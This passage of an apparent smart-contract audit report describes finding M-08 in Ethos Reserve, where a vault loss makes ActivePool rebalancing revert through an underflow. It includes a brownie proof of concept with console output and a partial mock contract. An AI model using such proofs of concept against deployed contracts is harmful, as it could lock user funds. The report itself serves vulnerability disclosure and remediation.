Steps</h3>\n<p>To mitigate this risk, it is recommended to follow the ERC2612 specification strictly and ensure that the <code>DOMAIN_SEPARATOR</code> is correctly implemented.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/818#issuecomment-1476439745\">tess3rac7 (Ethos Reserve) confirmed via duplicate issue <code>#818</code></a></strong></p>\n<hr>\n<h2 id=\"m-08-if-the-strategy-incurs-a-loss-the-active-pool-will-stop-working-until-the-shortfall-is-paid-out-entirely\" style=\"position:relative;\"><a href=\"#m-08-if-the-strategy-incurs-a-loss-the-active-pool-will-stop-working-until-the-shortfall-is-paid-out-entirely\" aria-label=\"m 08 if the strategy incurs a loss the active pool will stop working until the shortfall is paid out entirely permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/632\">[M-08] If the strategy incurs a loss the Active Pool will stop working until the shortfall is paid out entirely</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/632\">GalloDaSballo</a>, also found by <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/768\">MiloTruck</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/747\">bin2chen</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/722\">hansfriese</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/701\">imare</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/604\">KingNFT</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/578\">PaludoX0</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/541\">0xBeirao</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/447\">AkshaySrivastav</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/364\">kaden</a>, and <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/237\">0xRobocop</a></em></p>\n<ul>\n<li>Vaults are built with the idea that a <a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperVaultV2.sol#L385-L386\">loss could happen</a></li>\n<li>The scope mentions that a <a href=\"https://docs.reaper.farm/ethos-reserve-bounty-hunter-documentation/#community-usdoath-issuance:~:text=stays%20fully%20capitalized.-,The%20vault%20will%20be%20farming%20the%20lowest%2Drisk%20yield%20possible%2C%20so%20you%20can%20assume%20that%20the%20principal%20will%20be%20protected%20from%20loss.%20We%20encourage%20you%20nonetheless%20to%20analyze%20the%20impact%20of%20losses%20on%20the%20system.,-Balancer%20Pool%20Staking\">Loss scenario is in scope</a></li>\n</ul>\n<p>This line, is written with the assumption that <code>sharesToAssets</code> will always be greater than or equal to <code>currentAllocated</code></p>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/ActivePool.sol#L251-L252\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/ActivePool.sol#L251-L252</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"30\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">profit</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sharesToAssets</span><span class=\"mtk1\">.</span><span class=\"mtk11\">sub</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">currentAllocated</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>This is not the case as the Strategy MAY incur a loss.</p>\n<p>In such cases, <code>_rebalance</code> on the ActivePool will not work until the subtraction stops underflowing <code>vars.sharesToAssets.sub(vars.currentAllocated);</code> will revert if any loss (even 1 wei) has happened.</p>\n<h3 id=\"proof-of-concept-9\" style=\"position:relative;\"><a href=\"#proof-of-concept-9\" aria-label=\"proof of concept 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>When a loss happens, the <code>sharesToAssets</code> will decrease.</p>\n<p>Because <a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/ActivePool.sol#L243\"><code>vars.currentAllocated</code></a> tracks the amount deposited in the vault, this value will necessarily be greater than the <code>sharesToAsset</code> if any loss happened.</p>\n<p>In that case this line will revert:\n<code>vars.profit = vars.sharesToAssets.sub(vars.currentAllocated);</code></p>\n<p>In the code shown, a loss could happen if the LendingPool has accounting errors.</p>\n<p>For the in-scope codebase a loss could happen as a consequence of slashing or restructuring due to bad debt incurred by borrowers.</p>\n<h3 id=\"coded-poc\" style=\"position:relative;\"><a href=\"#coded-poc\" aria-label=\"coded poc permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Coded POC</h3>\n<p>The following POC was built with brownie.</p>\n<p>Mocked contract retain the core logic, but are rid of access control and other functions to keep the logic the same but reduce complexity of setup.</p>\n<p>Setup brownie via <code>brownie console</code> (local environment is fine as I set-up mocks to make it easy).</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"python\" data-index=\"31\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">## Setup tokens</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">token = MockToken.deploy({</span><span class=\"mtk8\">&quot;from&quot;</span><span class=\"mtk1\">: a[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">]})</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">## Deploy Vault</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">vault = ReaperVaultV2.deploy(token, {</span><span class=\"mtk8\">&quot;from&quot;</span><span class=\"mtk1\">: a[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">]})</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">## Deploy ActivePool</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">pool = MockActivePool.deploy(token, </span><span class=\"mtk7\">2000</span><span class=\"mtk1\">, vault, </span><span class=\"mtk7\">1</span><span class=\"mtk1\">, {</span><span class=\"mtk8\">&quot;from&quot;</span><span class=\"mtk1\">: a[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">]})</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">## Add to Active</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">token.approve(pool, </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">, {</span><span class=\"mtk8\">&quot;from&quot;</span><span class=\"mtk1\">: a[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">]})</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">pool.depositColl(</span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">, {</span><span class=\"mtk8\">&quot;from&quot;</span><span class=\"mtk1\">: a[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">]})</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">## Rebalance to invest</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">pool.manualRebalance(token, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, {</span><span class=\"mtk8\">&quot;from&quot;</span><span class=\"mtk1\">: a[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">]})</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">## 20% of tokens are in the vault</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">print</span><span class=\"mtk1\">(token.balanceOf(vault))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">200000000000000000</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">## Trigger loss to vault</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">vault.triggerLoss(</span><span class=\"mtk7\">1e17</span><span class=\"mtk1\">, {</span><span class=\"mtk8\">&quot;from&quot;</span><span class=\"mtk1\">: a[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">]})</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">## Confirm the loss has happened</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">print</span><span class=\"mtk1\">(vault.balance())</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">100000000000000000</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">## Now that a loss happened, any rebalance will revert</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">pool.manualRebalance(token, </span><span class=\"mtk7\">1</span><span class=\"mtk1\">, {</span><span class=\"mtk8\">&quot;from&quot;</span><span class=\"mtk1\">: a[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">]})</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">Transaction sent: </span><span class=\"mtk4\">0x</span><span class=\"mtk7\">798e759783ab59dda9c294178859fec5519179a2c31b89abbfea56bd7284b0bc</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  Gas price: </span><span class=\"mtk7\">0.0</span><span class=\"mtk1\"> gwei   Gas limit: </span><span class=\"mtk7\">12000000</span><span class=\"mtk1\">   Nonce: </span><span class=\"mtk7\">8</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  MockActivePool.manualRebalance confirmed (Integer overflow)   Block: </span><span class=\"mtk7\">9</span><span class=\"mtk1\">   Gas used: </span><span class=\"mtk7\">32821</span><span class=\"mtk1\"> (</span><span class=\"mtk7\">0.27</span><span class=\"mtk1\">%)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">&lt;Transaction </span><span class=\"mtk8\">&#39;0x798e759783ab59dda9c294178859fec5519179a2c31b89abbfea56bd7284b0bc&#39;</span><span class=\"mtk1\">&gt;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">pool.manualRebalance(token, </span><span class=\"mtk7\">100</span><span class=\"mtk1\">, {</span><span class=\"mtk8\">&quot;from&quot;</span><span class=\"mtk1\">: a[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">]})</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">Transaction sent: </span><span class=\"mtk4\">0x</span><span class=\"mtk7\">0c41ec1b74a05df6c7101522931cda6ba30139358ec239f014777d7e7e992563</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  Gas price: </span><span class=\"mtk7\">0.0</span><span class=\"mtk1\"> gwei   Gas limit: </span><span class=\"mtk7\">12000000</span><span class=\"mtk1\">   Nonce: </span><span class=\"mtk7\">9</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  MockActivePool.manualRebalance confirmed (Integer overflow)   Block: </span><span class=\"mtk7\">10</span><span class=\"mtk1\">   Gas used: </span><span class=\"mtk7\">32821</span><span class=\"mtk1\"> (</span><span class=\"mtk7\">0.27</span><span class=\"mtk1\">%)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">&lt;Transaction </span><span class=\"mtk8\">&#39;0x0c41ec1b74a05df6c7101522931cda6ba30139358ec239f014777d7e7e992563&#39;</span><span class=\"mtk1\">&gt;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">## That&#39;s because the loss has been registered by the Vault</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">print</span><span class=\"mtk1\">(vault.convertToAssets(</span><span class=\"mtk7\">1e17</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">50000000000000000</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">## But not by the Pool, triggering a revert at this line</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">&gt; </span><span class=\"mtk11\">vars</span><span class=\"mtk1\">.profit = </span><span class=\"mtk11\">vars</span><span class=\"mtk1\">.sharesToAssets.sub(</span><span class=\"mtk11\">vars</span><span class=\"mtk1\">.currentAllocated)</span><span class=\"mtk14\">;</span></span></span></code></pre>\n<h3 id=\"mocks-used\" style=\"position:relative;\"><a href=\"#mocks-used\" aria-label=\"mocks used permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Mocks Used</h3>\n<p><strong>ActivePool.sol</strong></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"32\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// SPDX-License-Identifier: BUSL-1.1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> ^</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> {</span><span class=\"mtk12\">ReaperVaultV2</span><span class=\"mtk1\">} </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;./ReaperVaultV2.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;@openzeppelin/contracts/utils/math/SafeMath.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">MockActivePool</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">using</span><span class=\"mtk1\"> </span><span class=\"mtk12\">SafeMath</span><span class=\"mtk1\"> </span><span class=\"mtk12\">for</span><span class=\"mtk1\"> </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">immutable</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collateral</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collAmount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">yieldingPercentage</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// collateral =&gt; % to use for yield farming (in BPS, &lt;= 10k)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">yieldingAmount</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// collateral =&gt; actual wei amount being used for yield farming</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">address</span><span class=\"mtk1\">) </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">yieldGenerator</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// collateral =&gt; corresponding ERC4626 vault</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">yieldClaimThreshold</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// collateral =&gt; minimum wei amount of yield to claim and redistribute</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">yieldingPercentageDrift</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">100</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// rebalance iff % is off by more than 100 BPS</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Yield distribution params, must add up to 10k</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">yieldSplitTreasury</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">20_00</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// amount of yield to direct to treasury in BPS</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">yieldSplitSP</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">40_00</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// amount of yield to direct to stability pool in BPS</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">yieldSplitStaking</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">40_00</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// amount of yield to direct to OATH Stakers in BPS</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Mock addresses, unused</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">treasuryAddress</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stabilityPoolAddress</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lqtyStakingAddress</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">3</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">constructor</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_yieldingPercentage</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_yieldGenerator</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_yieldClaimThreshold</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">collateral</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">yieldingPercentage</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">_yieldingPercentage</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">yieldGenerator</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">_yieldGenerator</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">yieldClaimThreshold</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">_yieldClaimThreshold</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">depositColl</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collateral</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span 